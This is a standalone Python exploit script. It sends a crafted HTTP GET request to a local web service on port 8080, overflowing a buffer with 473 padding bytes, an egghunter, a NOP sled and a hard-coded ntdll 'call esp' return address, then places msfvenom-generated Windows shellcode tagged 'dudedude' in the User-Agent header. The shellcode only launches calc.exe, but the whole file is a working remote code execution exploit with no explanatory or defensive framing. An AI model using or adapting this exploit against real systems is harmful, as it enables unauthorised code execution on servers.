import socket
import os
import sys
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Egghunter , tag dude : 
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x64\x75\x64\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#Put this tag in front of your shellcode : dudedude

#msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d" -f python
buf =  b""
buf += b"\xbb\xda\x2d\x03\x4b\xdb\xc2\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x31\x31\x5a\x13\x03\x5a\x13\x83\xc2\xde\xcf"
buf += b"\xf6\xb7\x36\x8d\xf9\x47\xc6\xf2\x70\xa2\xf7\x32\xe6"
buf += b"\xa6\xa7\x82\x6c\xea\x4b\x68\x20\x1f\xd8\x1c\xed\x10"
buf += b"\x69\xaa\xcb\x1f\x6a\x87\x28\x01\xe8\xda\x7c\xe1\xd1"
buf += b"\x14\x71\xe0\x16\x48\x78\xb0\xcf\x06\x2f\x25\x64\x52"
buf += b"\xec\xce\x36\x72\x74\x32\x8e\x75\x55\xe5\x85\x2f\x75"
buf += b"\x07\x4a\x44\x3c\x1f\x8f\x61\xf6\x94\x7b\x1d\x09\x7d"
buf += b"\xb2\xde\xa6\x40\x7b\x2d\xb6\x85\xbb\xce\xcd\xff\xb8"
buf += b"\x73\xd6\x3b\xc3\xaf\x53\xd8\x63\x3b\xc3\x04\x92\xe8"
buf += b"\x92\xcf\x98\x45\xd0\x88\xbc\x58\x35\xa3\xb8\xd1\xb8"
buf += b"\x64\x49\xa1\x9e\xa0\x12\x71\xbe\xf1\xfe\xd4\xbf\xe2"
buf += b"\xa1\x89\x65\x68\x4f\xdd\x17\x33\x05\x20\xa5\x49\x6b"
buf += b"\x22\xb5\x51\xdb\x4b\x84\xda\xb4\x0c\x19\x09\xf1\xe3"
buf += b"\x53\x10\x53\x6c\x3a\xc0\xe6\xf1\xbd\x3e\x24\x0c\x3e"
buf += b"\xcb\xd4\xeb\x5e\xbe\xd1\xb0\xd8\x52\xab\xa9\x8c\x54"
buf += b"\x18\xc9\x84\x36\xff\x59\x44\x97\x9a\xd9\xef\xe7"

#call esp 77AE57CE   ntdll
#jump back nasm $-120 EB 86

stuff = "A"*473 + egghunter + "\x90"*10 + "\xce\x57\xae\x77" + "\xeb\x86"
otherstuff = "dudedude" + buf
buffer =  "GET /" + stuff + " HTTP/1.1\r\n"
buffer += "Host: 172.16.0.24:8080\r\n"
buffer += "User-Agent: "+ otherstuff + "\r\n"
buffer += "Keep-Alive: 115\r\n"
buffer += "Connection: keep-alive\r\n\r\n"
 
s.connect(("127.0.0.1", 8080))
s.send(buffer)
s.close()
